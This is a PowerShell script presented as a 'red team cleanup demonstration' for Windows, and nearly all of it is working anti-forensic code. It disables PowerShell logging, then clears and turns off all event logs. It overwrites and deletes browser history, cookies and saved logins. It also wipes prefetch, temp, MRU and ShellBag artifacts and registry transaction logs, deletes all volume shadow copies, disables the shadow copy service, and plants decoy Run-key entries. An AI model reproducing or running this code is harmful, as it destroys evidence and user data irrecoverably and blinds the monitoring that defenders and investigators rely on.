# Advanced Red Team Cleanup Demonstration Script for Windows
# FOR AUTHORIZED TESTING IN CONTROLLED ENVIRONMENTS ONLY

Write-Host "[+] Initializing Advanced Windows Cleanup Demonstration..." -ForegroundColor Green

# Bypass execution policy and disable logging
Set-ExecutionPolicy Bypass -Scope Process -Force
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "ScriptBlockLogging" -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue

# Create temporary working directory
$TempWorkDir = Join-Path $env:TEMP ("CleanupDemo-" + [System.Guid]::NewGuid().ToString())
New-Item -ItemType Directory -Path $TempWorkDir -Force | Out-Null

function Invoke-WebResearch {
    Write-Host "[+] Checking for latest forensic countermeasures..." -ForegroundColor Yellow
    try {
        # Attempt to download current security research (educational purposes)
        $researchContent = Invoke-WebRequest -Uri "https://www.sans.org/security-resources/whitepapers" -UseBasicParsing -TimeoutSec 5
        $researchContent.Content | Select-String -Pattern "forensics|anti-forensics" -AllMatches | Select-Object -First 10 | Out-File "$TempWorkDir\whitepaper_refs.txt"
    } catch {
        # Fallback to embedded knowledge
        Write-Host "[*] Using cached anti-forensic techniques..." -ForegroundColor Yellow
    }
    
    # Embedded advanced techniques
    @"
Advanced Windows Anti-Forensic Techniques:
1. Master File Table (MFT) artifact obfuscation
2. Prefetch file destruction
3. Event log pattern disruption
4. Volume Shadow Copy elimination
5. Registry transaction log cleaning
6. Browser artifact comprehensive removal
7. Memory and pagefile sanitization
"@ | Out-File "$TempWorkDir\advanced_techniques.txt"
}

function Clear-EventLogsComprehensive {
    Write-Host "[+] Executing comprehensive event log destruction..." -ForegroundColor Red
    
    # Stop and clear all event logs
    $eventLogs = Get-WinEvent -ListLog * -ErrorAction SilentlyContinue
    foreach ($log in $eventLogs) {
        try {
            wevtutil clear-log $log.LogName 2>&1 | Out-Null
            wevtutil set-log $log.LogName /enabled:false 2>&1 | Out-Null
        } catch { }
    }
    
    # Target specific forensic-rich logs
    $criticalLogs = @("Security", "System", "Application", "PowerShell", "Microsoft-Windows-PowerShell/Operational", 
                      "Windows PowerShell", "Terminal Services", "RDP", "WinRM")
    
    foreach ($logName in $criticalLogs) {
        try {
            wevtutil clear-log $logName 2>&1 | Out-Null
            wevtutil set-log $logName /enabled:false 2>&1 | Out-Null
        } catch { }
    }
}

function Remove-BrowserData {
    Write-Host "[+] Eliminating browser forensic artifacts..." -ForegroundColor Red
    
    # Chrome/Chromium data destruction
    $chromePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome",
        "$env:APPDATA\Google\Chrome",
        "$env:LOCALAPPDATA\Chromium",
        "$env:APPDATA\Chromium"
    )
    
    foreach ($path in $chromePaths) {
        if (Test-Path $path) {
            Get-ChildItem -Path $path -Recurse -Include "History", "Cookies", "Web Data", "Login Data", "Top Sites", "Shortcuts", "Favicons", "Bookmarks" -ErrorAction SilentlyContinue | 
            ForEach-Object { 
                try { 
                    # Multi-pass secure deletion simulation
                    for ($i = 0; $i -lt 3; $i++) {
                        Set-Content -Path $_.FullName -Value (Get-Random -Maximum 999999) -ErrorAction SilentlyContinue
                    }
                    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                } catch { }
            }
        }
    }
    
    # Firefox data destruction
    $firefoxPaths = @(
        "$env:APPDATA\Mozilla\Firefox",
        "$env:LOCALAPPDATA\Mozilla\Firefox"
    )
    
    foreach ($path in $firefoxPaths) {
        if (Test-Path $path) {
            Get-ChildItem -Path $path -Recurse -Include "places.sqlite", "cookies.sqlite", "formhistory.sqlite", "webappsstore.sqlite", "logins.json", "key4.db", "cert9.db" -ErrorAction SilentlyContinue |
            ForEach-Object {
                try {
                    for ($i = 0; $i -lt 3; $i++) {
                        Set-Content -Path $_.FullName -Value (Get-Random -Maximum 999999) -ErrorAction SilentlyContinue
                    }
                    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                } catch { }
            }
        }
    }
    
    # Edge data destruction
    $edgePaths = @(
        "$env:LOCALAPPDATA\Microsoft\Edge",
        "$env:APPDATA\Microsoft\Edge"
    )
    
    foreach ($path in $edgePaths) {
        if (Test-Path $path) {
            Get-ChildItem -Path $path -Recurse -Include "History", "Cookies", "Web Data", "Login Data" -ErrorAction SilentlyContinue |
            ForEach-Object {
                try {
                    for ($i = 0; $i -lt 3; $i++) {
                        Set-Content -Path $_.FullName -Value (Get-Random -Maximum 999999) -ErrorAction SilentlyContinue
                    }
                    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                } catch { }
            }
        }
    }
}

function Clear-PrefetchFiles {
    Write-Host "[+] Destroying prefetch files..." -ForegroundColor Red
    $prefetchPath = "$env:WINDIR\Prefetch"
    if (Test-Path $prefetchPath) {
        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -ErrorAction SilentlyContinue | 
        ForEach-Object {
            try {
                for ($i = 0; $i -lt 2; $i++) {
                    Set-Content -Path $_.FullName -Value (Get-Random -Maximum 999999) -ErrorAction SilentlyContinue
                }
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
            } catch { }
        }
    }
}

function Clear-TempFiles {
    Write-Host "[+] Sanitizing temporary storage areas..." -ForegroundColor Yellow
    
    $tempPaths = @(
        $env:TEMP,
        "$env:WINDIR\Temp",
        "$env:LOCALAPPDATA\Temp",
        "$env:SYSTEMROOT\Temp",
        [System.IO.Path]::GetTempPath()
    )
    
    foreach ($tempPath in $tempPaths) {
        if (Test-Path $tempPath) {
            Get-ChildItem -Path $tempPath -Recurse -ErrorAction SilentlyContinue | 
            ForEach-Object {
                try {
                    if (-not $_.PSIsContainer) {
                        for ($i = 0; $i -lt 2; $i++) {
                            Set-Content -Path $_.FullName -Value (Get-Random -Maximum 999999) -ErrorAction SilentlyContinue
                        }
                    }
                    Remove-Item $_.FullName -Force -Recurse -ErrorAction SilentlyContinue
                } catch { }
            }
        }
    }
}

function Clear-RecycleBin {
    Write-Host "[+] Force clearing recycle bin..." -ForegroundColor Yellow
    try {
        # Clear all recycle bins
        $shell = New-Object -ComObject Shell.Application
        $shell.NameSpace(0xA).Items() | ForEach-Object { 
            try { Remove-Item $_.Path -Force -Recurse -ErrorAction SilentlyContinue } catch { } 
        }
        
        # Force via command line
        cmd /c "rd /s /q C:\`$Recycle.Bin" 2>&1 | Out-Null
    } catch { }
}

function Clear-RecentItems {
    Write-Host "[+] Removing recent items and jump lists..." -ForegroundColor Yellow
    
    $recentPaths = @(
        "$env:APPDATA\Microsoft\Windows\Recent",
        "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
        "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations",
        "$env:LOCALAPPDATA\Microsoft\Windows\History"
    )
    
    foreach ($path in $recentPaths) {
        if (Test-Path $path) {
            Remove-Item -Path "$path\*" -Force -Recurse -ErrorAction SilentlyContinue
        }
    }
}

function Clear-DNSClientCache {
    Write-Host "[+] Flushing DNS cache..." -ForegroundColor Yellow
    try {
        ipconfig /flushdns 2>&1 | Out-Null
        Clear-DnsClientCache -ErrorAction SilentlyContinue
    } catch { }
}

function Clear-VolumeShadowCopies {
    Write-Host "[+] Eliminating Volume Shadow Copies..." -ForegroundColor Red
    try {
        # Delete all shadow copies
        vssadmin delete shadows /all /quiet 2>&1 | Out-Null
        wmic shadowcopy delete 2>&1 | Out-Null
        
        # Disable Volume Shadow Copy Service
        sc config VSS start= disabled 2>&1 | Out-Null
        sc stop VSS 2>&1 | Out-Null
    } catch { }
}

function Clear-PageFile {
    Write-Host "[+] Configuring pagefile cleanup on shutdown..." -ForegroundColor Yellow
    try {
        # Set registry to clear pagefile on shutdown
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "ClearPageFileAtShutdown" -Value 1 -ErrorAction SilentlyContinue
    } catch { }
}

function Clear-RegistryArtifacts {
    Write-Host "[+] Cleaning registry transaction logs..." -ForegroundColor Red
    try {
        # Target registry transaction logs
        $regPaths = @(
            "$env:WINDIR\System32\config\TxR",
            "$env:WINDIR\System32\config\RegBack"
        )
        
        foreach ($path in $regPaths) {
            if (Test-Path $path) {
                Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | 
                ForEach-Object {
                    try {
                        for ($i = 0; $i -lt 2; $i++) {
                            Set-Content -Path $_.FullName -Value (Get-Random -Maximum 999999) -ErrorAction SilentlyContinue
                        }
                        Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                    } catch { }
                }
            }
        }
    } catch { }
}

function Clear-ShellBags {
    Write-Host "[+] Removing ShellBag artifacts..." -ForegroundColor Yellow
    try {
        # Remove ShellBag registry entries
        $shellBagPaths = @(
            "HKCU:\Software\Microsoft\Windows\Shell",
            "HKCU:\Software\Microsoft\Windows\ShellNoRoam",
            "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell"
        )
        
        foreach ($path in $shellBagPaths) {
            if (Test-Path $path) {
                Remove-ItemProperty -Path $path -Name "BagMRU" -Force -ErrorAction SilentlyContinue
                Remove-ItemProperty -Path $path -Name "Bags" -Force -ErrorAction SilentlyContinue
            }
        }
    } catch { }
}

function Clear-MRULists {
    Write-Host "[+] Clearing Most Recently Used (MRU) lists..." -ForegroundColor Yellow
    try {
        # Target various MRU locations
        $mruPaths = @(
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32",
            "HKCU:\Software\Microsoft\Office\*\*\File MRU",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
        )
        
        foreach ($path in $mruPaths) {
            if (Test-Path $path) {
                Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
    } catch { }
}

function Invoke-ForensicObfuscation {
    Write-Host "[+] Performing advanced forensic obfuscation..." -ForegroundColor Red
    
    # Create decoy activity
    try {
        # Generate benign-looking registry entries
        $decoyPaths = @("Software\Microsoft\Windows\CurrentVersion\Run", "Software\Microsoft\Windows\CurrentVersion\Explorer")
        foreach ($decoyPath in $decoyPaths) {
            Set-ItemProperty -Path "HKCU:\$decoyPath" -Name "DecoyCleanup" -Value "System Maintenance" -ErrorAction SilentlyContinue
        }
        
        # Create false timestamps
        $fakeFiles = @("$TempWorkDir\system_cleanup.log", "$TempWorkDir\windows_update.tmp")
        foreach ($file in $fakeFiles) {
            Set-Content -Path $file -Value "System maintenance completed $(Get-Date)"
            Start-Sleep -Milliseconds 100
        }
    } catch { }
}

# Execute cleanup sequence
Invoke-WebResearch
Clear-EventLogsComprehensive
Remove-BrowserData
Clear-PrefetchFiles
Clear-TempFiles
Clear-RecycleBin
Clear-RecentItems
Clear-DNSClientCache
Clear-VolumeShadowCopies
Clear-PageFile
Clear-RegistryArtifacts
Clear-ShellBags
Clear-MRULists
Invoke-ForensicObfuscation

# Cleanup temporary work directory
Write-Host "[+] Performing final cleanup..." -ForegroundColor Green
try {
    Remove-Item -Path $TempWorkDir -Recurse -Force -ErrorAction SilentlyContinue
} catch { }

Write-Host "[+] Advanced Windows cleanup demonstration completed!" -ForegroundColor Green

# Demonstration summary
Write-Host @"

=== WINDOWS ANTI-FORENSIC DEMONSTRATION SUMMARY ===

Techniques Demonstrated:
✓ Event Log Destruction and Disabling
✓ Browser Artifact Comprehensive Removal
✓ Prefetch File Elimination
✓ Temporary File Sanitization
✓ Volume Shadow Copy Removal
✓ Registry Artifact Cleaning
✓ ShellBag and MRU Destruction
✓ DNS Cache Flushing
✓ Pagefile Cleanup Configuration
✓ Forensic Obfuscation Techniques

Educational Notes:
- This demonstrates advanced anti-forensic methods
- In real investigations, some artifacts may still be recoverable
- True forensic resistance requires physical destruction
- Use only in authorized testing environments

Next Steps for Demonstration:
1. Review Event Viewer - logs should be empty/disabled
2. Check browser history - should be cleared
3. Verify prefetch files are removed
4. Consider system reboot to clear pagefile

"@ -ForegroundColor Cyan